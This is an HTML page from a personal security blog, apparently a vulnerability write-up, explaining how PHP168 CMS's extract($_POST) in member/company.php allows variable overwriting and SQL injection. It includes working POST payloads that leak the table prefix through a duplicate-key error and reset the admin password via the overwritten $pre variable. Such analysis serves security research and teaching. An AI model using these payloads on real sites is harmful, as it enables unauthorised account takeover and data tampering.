@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="变量覆盖导致的sql注入"/>
+  <meta name="twitter:description" content=".
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>变量覆盖导致的sql注入 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        变量覆盖导致的sql注入
+                    </h1>
+                    <h2 class="headline">
+                    May 30, 2018 09:54
+                    · 308 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/%E6%B8%97%E9%80%8F">渗透</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#关键代码">关键代码</a></li>
+<li><a href="#实现">实现</a></li>
+<li><a href="#意外发现">意外发现</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>.
+<!-- more --></p>
+
+<h3 id="关键代码">关键代码</h3>
+
+<p>php168feilei/member/company.php</p>
+
+<pre><code>&lt;?php
+header(&quot;content-type:text/html;charset=utf-8&quot;);
+require(dirname(__FILE__).&quot;/&quot;.&quot;global.php&quot;);
+require(dirname(__FILE__).&quot;/../&quot;.&quot;php168/all_area.php&quot;);
+if($job=='edit'){
+  if(!$lfjid){
+    showerr(&quot;你还没登录&quot;);
+  }
+  // echo $lfjuid;
+  $cpDB=$db-&gt;get_one(&quot;SELECT * FROM `{$pre}memberdata_1` WHERE uid='$lfjuid'&quot;);
+  if($step==2){
+    foreach( $_POST AS $key=&gt;$value){
+      $_POST[$key]=filtrate($value); //filtrate函数是一个过滤特殊字符的函数
+    }
+    @extract($_POST);
+    if(!$cpname){showerr(&quot;企业名称不能为空&quot;);}
+    if(!$cptype){showerr(&quot;请选择企业性质&quot;);}
+    if(!$cptrade){showerr(&quot;请选择企业所属行业&quot;);}
+    if(!$cpfounder){showerr(&quot;企业法人不能为空&quot;);}
+    if(!$cptelephone){showerr(&quot;公司电话不能为空&quot;);}
+    if(!$cpaddress){showerr(&quot;公司地址不能为空&quot;);}
+    if(!$cpcity){showerr(&quot;请选择企业所在城市&quot;);}
+    if(!$cpcode){showerr(&quot;组织机构代码不能为空&quot;);}
+    // if(!ereg(&quot;^[0-9]{8}&quot;,$cpcode)){
+    //  showerr(&quot;请认真填写组织机构代码&quot;); //如果不想严格控制机构码,请把这一行删除
+    // }
+    if(!$cpDB){
+    // echo $lfjuid;
+    // echo &quot;sjdkashdlka&quot;;
+      $db-&gt;query(&quot;INSERT INTO `{$pre}memberdata_1` ( `uid` , `cpname` , `cplogo` , `cptype` , `cptrade` , `cpproduct` , `cpcity` , `cpfoundtime` , `cpfounder` , `cpmannum` , `cpmoney` , `cpcode` , `cppermit` , `cpweb` , `cppostcode` , `cptelephone` , `cpfax` , `cpaddress` ,`cplinkman`,`cpmobphone`,`cpqq`,`cpmsn`) VALUES ( '$lfjuid','$cpname','$cplogo','$cptype','$cptrade','$cpproduct','$cpcity','$cpfoundtime','$cpfounder','$cpmannum','$cpmoney','$cpcode','$cppermit','$cpweb','$cppostcode','$cptelephone','$cpfax','$cpaddress','$cplinkman','$cpmobphone','$cpqq','$cpmsn')&quot;);
+      $grouptype=$webdb[AutoPassCompany]?'1':'-1';
+      $db-&gt;query(&quot;UPDATE {$pre}memberdata SET grouptype='$grouptype' WHERE uid='$lfjuid'&quot;);
+      // refreshto(&quot;company.php?job=edit&quot;,&quot;你的资料已经提交&quot;,1);  
+    }else{
+      echo &quot;2&quot;;
+      $db-&gt;query(&quot;UPDATE {$pre}memberdata_1 SET cpname='$cpname',cplogo='$cplogo',cptype='$cptype',cptrade='$cptrade',cpproduct='$cpproduct',cpcity='$cpcity',cpfoundtime='$cpfoundtime',cpfounder='$cpfounder',cpmannum='$cpmannum',cpmoney='$cpmoney',cpcode='$cpcode',cppermit='$cppermit',cpweb='$cpweb',cppostcode='$cppostcode',cptelephone='$cptelephone',cpfax='$cpfax',cpaddress='$cpaddress',cplinkman='$cplinkman',cpmobphone='$cpmobphone',cpqq='$cpqq',cpmsn='$cpmsn' WHERE uid='$lfjuid'&quot;);
+      // refreshto(&quot;company.php?job=edit&quot;,&quot;修改成功&quot;,1);
+    }     
+  }
+  $cptype[$cpDB[cptype]]=' selected ';  
+}elseif($job=='view'){
+  $cpDB=$db-&gt;get_one(&quot;SELECT * FROM `{$pre}memberdata_1` WHERE uid='$uid'&quot;);
+  if(!$cpDB){
+    showerr(&quot;资料不存在!!&quot;);
+  }
+}
+
+// require(dirname(__FILE__).&quot;/&quot;.&quot;head.php&quot;);
+// require(dirname(__FILE__).&quot;/&quot;.&quot;template/company.htm&quot;);
+// require(dirname(__FILE__).&quot;/&quot;.&quot;foot.php&quot;);
+
+?&gt;
+
+</code></pre>
+
+<p>第13行</p>
+
+<pre><code>//此函数是将数组中的key作为变量名，value作为变量的值。容易出现变量覆盖。
+@extract($_POST);
+</code></pre>
+
+<p>继续往下看这一段</p>
+
+<pre><code>else{
+			echo &quot;2&quot;;
+			$db-&gt;query(&quot;UPDATE {$pre}memberdata_1 SET cpname='$cpname',cplogo='$cplogo',cptype='$cptype',cptrade='$cptrade',cpproduct='$cpproduct',cpcity='$cpcity',cpfoundtime='$cpfoundtime',cpfounder='$cpfounder',cpmannum='$cpmannum',cpmoney='$cpmoney',cpcode='$cpcode',cppermit='$cppermit',cpweb='$cpweb',cppostcode='$cppostcode',cptelephone='$cptelephone',cpfax='$cpfax',cpaddress='$cpaddress',cplinkman='$cplinkman',cpmobphone='$cpmobphone',cpqq='$cpqq',cpmsn='$cpmsn' WHERE uid='$lfjuid'&quot;);
+			refreshto(&quot;company.php?job=edit&quot;,&quot;修改成功&quot;,1);
+		}	
+
+</code></pre>
+
+<p>这里的update语句用到了一个变量\$pre,这个变量是网站建设者在建设网站时设定的表前缀(默认是p8_)，注入点就是这里。</p>
+
+<p>我们可以利用上面的变量覆盖漏洞，将\$pre的值构造为sql语句。这样我们就可以随意更改表中的数据。</p>
+
+<h3 id="实现">实现</h3>
+
+<p>在利用这个漏洞的时候我们必须要知道网站建设者自定义的表前缀是什么。</p>
+
+<p>获取表前缀利用的是下面这段代码</p>
+
+<pre><code>$db-&gt;query(&quot;INSERT INTO `{$pre}memberdata_1` ( `uid` , `cpname` , `cplogo` , `cptype` , `cptrade` , `cpproduct` , `cpcity` , `cpfoundtime` , `cpfounder` , `cpmannum` , `cpmoney` , `cpcode` , `cppermit` , `cpweb` , `cppostcode` , `cptelephone` , `cpfax` , `cpaddress` ,`cplinkman`,`cpmobphone`,`cpqq`,`cpmsn`) VALUES ( '$lfjuid','$cpname','$cplogo','$cptype','$cptrade','$cpproduct','$cpcity','$cpfoundtime','$cpfounder','$cpmannum','$cpmoney','$cpcode','$cppermit','$cpweb','$cppostcode','$cptelephone','$cpfax','$cpaddress','$cplinkman','$cpmobphone','$cpqq','$cpmsn')&quot;);
+
+</code></pre>
+
+<p>这里的insert语句会向表中存储信息，表里的uid是唯一的，所以我们构造一个相同的uid去尝试存储，那么数据库就会报错，报错的内容中含有表名，这样就可以获取表前缀了。</p>
+
+<p>如果想要执行insert语句，还需要满足条件</p>
+
+<pre><code>if(!$cpDB){
+</code></pre>
+
+<p>这里还是利用上面的变量覆盖将$cpDB覆盖就好。</p>
+
+<p>payload</p>
+
+<pre><code>http://127.0.0.1/cms/php168/member/company.php?job=edit&amp;step=2
+
+POST数据
+cpname=1&amp;cptype=1&amp;cptrade=1&amp;cpfounder=1&amp;cptelephone=1&amp;cpaddress=1&amp;cpcity=1&amp;cpcode=1&amp;lfjuid=2&amp;cpDB=0
+
+</code></pre>
+
+<p>报错内容</p>
+
+<pre><code>数据库连接出错:INSERT INTO `p8_memberdata_1` ( `uid` , `cpname` , `cplogo` , `cptype` , `cptrade` , `cpproduct` , `cpcity` , `cpfoundtime` , `cpfounder` , `cpmannum` , `cpmoney` , `cpcode` , `cppermit` , `cpweb` , `cppostcode` , `cptelephone` , `cpfax` , `cpaddress` ,`cplinkman`,`cpmobphone`,`cpqq`,`cpmsn`) VALUES ( '2','1','','1','1','','1','','1','','','1','','','','1','','1','','','','')
+
+Duplicate entry '2' for key 'uid'
+1062
+</code></pre>
+
+<p>现在已经获取表前缀为p8_，解下来就可以更改admin的密码了。</p>
+
+<p>payload</p>
+
+<pre><code>http://127.0.0.1/cms/php168/member/company.php?job=edit&amp;step=2
+
+POST数据
+cpname=1&amp;cptype=1&amp;cptrade=1&amp;cpfounder=1&amp;cptelephone=1&amp;cpaddress=1&amp;cpcity=1&amp;cpcode=1&amp;lfjuid=2&amp;cpDB=1&amp;pre=/**/p8_members/**/set/**/password=md5(12345)/**/where/**/uid=1%23
+
+</code></pre>
+
+<p>这样就可以将admin的密码重置为12345了。</p>
+
+<h3 id="意外发现">意外发现</h3>
+
+<p>在php5.2.17版本下，php会自动的将GET和POST的key作为变量名，将value赋给该变量。
+例：
+45.php的代码</p>
+
+<pre><code>&lt;?php
+echo $step;
+</code></pre>
+
+<p>url</p>
+
+<pre><code>127.0.0.1/45.php?step=222
+
+输出结果为222
+
+</code></pre>
+
+<p>在阅读/php158/inc/common.inc.php的代码时发现42到47行。</p>
+
+<pre><code>foreach($_POST as $_key=&gt;$_value){
+	!ereg(&quot;^\_[A-Z]+&quot;,$_key) &amp;&amp; $$_key=$_POST[$_key];
+}
+foreach($_GET as $_key=&gt;$_value){
+	!ereg(&quot;^\_[A-Z]+&quot;,$_key) &amp;&amp; $$_key=$_GET[$_key];
+}
+
+</code></pre>
+
+<p>这里也是存在变量覆盖的，不过跟进\$pre变量后，发现\$pre的初始化在common.inc.php的第112-117行，不然的话，这段代码也会造成注入。</p>
+
+<p>源码 <a href="http://down.admin5.com/php/1265.html">http://down.admin5.com/php/1265.html</a></p>
+
+<p>php语法</p>
+
+<pre><code>&lt;?php 
+!0 &amp;&amp; $a=1;
+echo $a;
+//输出为1
+!1 &amp;&amp; $a=1;
+echo $a;
+//输出为空
+&gt;
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2f3%25E5%258F%2598%25E9%2587%258F%25E8%25A6%2586%25E7%259B%2596%25E5%25AF%25BC%25E8%2587%25B4%25E7%259A%2584sql%25E6%25B3%25A8%25E5%2585%25A5%2f - %e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%e5%af%bc%e8%87%b4%e7%9a%84sql%e6%b3%a8%e5%85%a5 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
